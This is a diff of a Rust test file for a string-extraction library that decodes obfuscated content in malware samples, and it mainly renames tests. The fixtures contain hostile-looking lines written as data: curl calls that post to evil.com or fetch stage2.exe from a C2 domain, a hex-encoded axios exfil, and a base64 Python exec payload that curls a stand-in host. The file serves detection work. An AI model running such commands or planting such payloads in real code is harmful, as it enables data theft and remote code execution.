@@ -1,12 +1,12 @@
 //! Tests for text file encoding detection and decoding.
 //!
 //! Ensures that text files with encoded content (hex, base64, URL-encoding, etc.)
-//! are properly decoded and made searchable for API consumers like DISSECT.
+//! are properly decoded and made searchable for API consumers.
 
 use stng::{ExtractOptions, StringKind, StringMethod};
 
 #[test]
-fn test_text_file_hex_decoding() {
+fn decodes_hex_javascript() {
     // Hex-encoded JavaScript malware (common in npm packages)
     let hex_content = "636F6E7374205F30783163313030303D5F3078323330643B66756E6374696F6E205F307832333064285F30783939366132322C5F3078353839613536297B636F6E7374205F30783131303533613D5F30783131303528293B72657475726E205F3078323330643D66756E6374696F6E";
 
@@ -47,7 +47,7 @@ fn test_text_file_hex_decoding() {
 }
 
 #[test]
-fn test_hex_then_xor_decodes_nsis_system_calls() {
+fn decodes_hex_then_xor_nsis_calls() {
     // The NSIS bytecode in this sample hex-decodes the file, XORs it with
     // 0xEC, then feeds the result to System.dll::Call. The encoded file is
     // kept intact here so this regression covers the public extraction path.
@@ -76,7 +76,7 @@ fn test_hex_then_xor_decodes_nsis_system_calls() {
 }
 
 #[test]
-fn test_hex_then_xor_decodes_nsis_self_read_loader() {
+fn decodes_hex_then_xor_nsis_loader() {
     // This sibling installer stores the decoded call stream in hex and XORs
     // each byte with 0x23. The stream then reads and executes a file range.
     let encoded = &crate::common::bytes("testdata/nsis/4d49_Constraining.Opm");
@@ -94,7 +94,7 @@ fn test_hex_then_xor_decodes_nsis_self_read_loader() {
 }
 
 #[test]
-fn test_text_file_base64_decoding() {
+fn decodes_base64_text_file() {
     // Base64-encoded secret
     let base64_content = "c2VjcmV0X2FwaV9rZXlfMTIzNDU2Nzg5MA=="; // "secret_api_key_1234567890"
 
@@ -120,7 +120,7 @@ fn test_text_file_base64_decoding() {
 }
 
 #[test]
-fn test_text_file_url_decoding() {
+fn decodes_url_encoded_text_file() {
     // URL-encoded command injection
     let url_content = "curl%20-X%20POST%20https%3A%2F%2Fevil.com%2Fexfil";
 
@@ -145,7 +145,7 @@ fn test_text_file_url_decoding() {
 }
 
 #[test]
-fn test_text_file_unicode_escape_decoding() {
+fn decodes_backslash_x_escapes() {
     // Unicode escape sequences (common in JavaScript obfuscation)
     let unicode_content = r"\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64"; // "Hello World"
 
@@ -174,29 +174,29 @@ fn test_text_file_unicode_escape_decoding() {
 }
 
 #[test]
-fn test_dissect_api_gets_decoded_content() {
-    // Simulate what DISSECT receives when analyzing a text file with hex-encoded malware
+fn api_consumers_get_decoded_content() {
+    // Simulate what an API consumer receives when analyzing a text file with hex-encoded malware
     let malware_content = "636F6E73742073656372657420"; // "const secret"
 
     let opts = ExtractOptions::new(4);
     let strings = stng::extract_strings_with_options(malware_content.as_bytes(), &opts);
 
-    // DISSECT should be able to search the decoded content
+    // A consumer should be able to search the decoded content
     let can_search_const = strings.iter().any(|s| s.value.contains("const"));
     let can_search_secret = strings.iter().any(|s| s.value.contains("secret"));
 
     assert!(
         can_search_const,
-        "DISSECT should be able to search for 'const' in decoded content"
+        "A consumer should be able to search for 'const' in decoded content"
     );
     assert!(
         can_search_secret,
-        "DISSECT should be able to search for 'secret' in decoded content"
+        "A consumer should be able to search for 'secret' in decoded content"
     );
 }
 
 #[test]
-fn test_library_deduplicates_keeps_decoded() {
+fn keeps_hex_decode_over_raw() {
     // When both encoded and decoded versions exist at same offset,
     // library should keep the decoded version (higher priority)
     let hex_content = "48656C6C6F20576F726C6421"; // "Hello World!" (12 bytes, 24 hex chars)
@@ -223,7 +223,7 @@ fn test_library_deduplicates_keeps_decoded() {
 }
 
 #[test]
-fn test_multiline_hex_in_text_file() {
+fn decodes_multiline_hex() {
     // Text file with multiple lines of hex-encoded content (both > 16 chars)
     let content = "636F6E7374206170693D2768747470733A2F2F6170692E6578616D706C652E636F6D273B\n\
                    636F6E7374207365637265743D27746F6B656E313233343536373839273B";
@@ -255,7 +255,7 @@ fn test_multiline_hex_in_text_file() {
 }
 
 #[test]
-fn test_mixed_encodings_in_text_file() {
+fn decodes_mixed_encodings() {
     // Text file with multiple encoding types (all meeting minimum lengths)
     let content = "48656C6C6F20576F726C6421204865726520697320736F6D65206D6F726520746578742E\n\
                    SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgc3RyaW5nLg==\n\
@@ -282,7 +282,7 @@ fn test_mixed_encodings_in_text_file() {
 }
 
 #[test]
-fn test_real_world_woff2_malware() {
+fn decodes_woff2_hex_javascript() {
     // Simulate the real file from the issue: .woff2 file with embedded hex-encoded JS
     let hex_js = "636F6E7374205F30783163313030303D5F3078323330643B66756E6374696F6E205F307832333064285F30783939366132322C5F3078353839613536297B636F6E7374205F30783131303533613D5F30783131303528293B72657475726E205F3078323330643D66756E6374696F6E285F30783233306434612C5F3078313737373530297B5F30783233306434613D5F30783233306434612D30783136323B6C6574205F30783235303861353D5F30783131303533615B5F30783233306434615D3B";
 
@@ -317,7 +317,7 @@ fn test_real_world_woff2_malware() {
 }
 
 #[test]
-fn test_json_output_consistency_with_cli() {
+fn returns_decoded_hex_to_library_callers() {
     // Ensure that what users see in CLI matches what's in JSON output
     // (both should show decoded content)
     let hex_content = "636F6E73742073656372657420"; // "const secret"
@@ -337,8 +337,8 @@ fn test_json_output_consistency_with_cli() {
 }
 
 #[test]
-fn test_dissect_api_consumer_workflow() {
-    // Simulate how DISSECT (and other API consumers) use stng to extract and search strings
+fn api_consumer_workflow_finds_decoded_strings() {
+    // Simulate how API consumers use stng to extract and search strings
     let malware_hex = "636F6E7374207365637265743D2768747470733A2F2F6170692E6576696C2E636F6D2F6578\
                        66696C273B0A636F6E7374206B65793D2761626364313233273B0A66756E6374696F6E206578\
                        66696C286461746129207B72657475726E206178696F732E706F7374287365637265742C6461\
@@ -380,7 +380,7 @@ fn test_dissect_api_consumer_workflow() {
 }
 
 #[test]
-fn test_utf16le_bom_javascript_malware() {
+fn decodes_utf16le_bom_javascript() {
     // Real-world UTF-16LE encoded JavaScript malware sample (79197527.js)
     // This file starts with UTF-16LE BOM (0xFF 0xFE) and contains obfuscated JavaScript
     // that creates files, executes wscript.exe, and runs PowerShell commands
@@ -436,7 +436,7 @@ F\x00a\x00g\x00d\x00C\x00 \x00=\x00 \x00(\x00\"\x00\\\xAA\xDA\x02\xFD\xFF\
 }
 
 #[test]
-fn test_utf16be_bom_detection() {
+fn decodes_utf16be_bom_text() {
     // UTF-16BE BOM (0xFE 0xFF) followed by "Hello World"
     let utf16be_data = b"\xFE\xFF\
 \x00H\x00e\x00l\x00l\x00o\x00 \x00W\x00o\x00r\x00l\x00d";
@@ -489,7 +489,7 @@ fn malformed_utf16_bom_with_utf8_payload_is_scanned_as_text() {
 /// carries a stray NUL or invalid UTF-8 byte, and its encoded payloads must
 /// still be decoded.
 #[test]
-fn test_bom_prefixed_8bit_text_is_not_decoded_as_utf16() {
+fn keeps_8bit_text_behind_utf16_bom() {
     let mut nul = b"\xFF\xFE@echo off\r\nrem \x00\r\n".to_vec();
     nul.extend_from_slice(b"curl http://c2-evil-domain.ru/stage2.exe\r\n");
     let mut high = b"\xFF\xFE@echo off\r\nrem \x80\r\n".to_vec();
@@ -512,5 +512,37 @@ fn test_bom_prefixed_8bit_text_is_not_decoded_as_utf16() {
             .iter()
             .any(|s| s.value.contains("hidden-c2-payload.ru")),
         "{strings:?}"
+    );
+}
+
+#[test]
+fn utf16_strings_are_located_in_the_utf16_bytes() {
+    let text = "Hello there, fetching http://utf16.example/payload now";
+    let mut data = vec![0xFF, 0xFE];
+    data.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
+    let strings = stng::extract_strings_with_options(&data, &stng::ExtractOptions::new(4));
+    let url = strings
+        .iter()
+        .find(|s| s.value.contains("http://utf16.example/payload"))
+        .expect("the URL is found");
+    let chars_before = text.find(url.value.as_str()).unwrap();
+    assert_eq!(url.data_offset, 2 + 2 * chars_before as u64, "{url:?}");
+    assert_eq!(url.data_len as usize, 2 * url.value.len(), "{url:?}");
+}
+
+#[test]
+fn malformed_bom_script_payloads_are_located_in_the_file() {
+    // A UTF-16LE BOM in front of 8-bit text.
+    let script = "import base64\nexec(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnY3VybCBodHRwOi8vYm9tLmV4YW1wbGUveCcpCg=='))\n";
+    let mut data = vec![0xFF, 0xFE];
+    data.extend_from_slice(script.as_bytes());
+    let strings = stng::extract_strings_with_options(&data, &stng::ExtractOptions::new(4));
+    let decoded = strings
+        .iter()
+        .find(|s| s.method == stng::StringMethod::ScriptDecode && s.value.contains("bom.example"))
+        .expect("the payload is decoded");
+    assert_eq!(
+        decoded.data_offset,
+        2 + script.find("exec(").unwrap() as u64
     );
 }
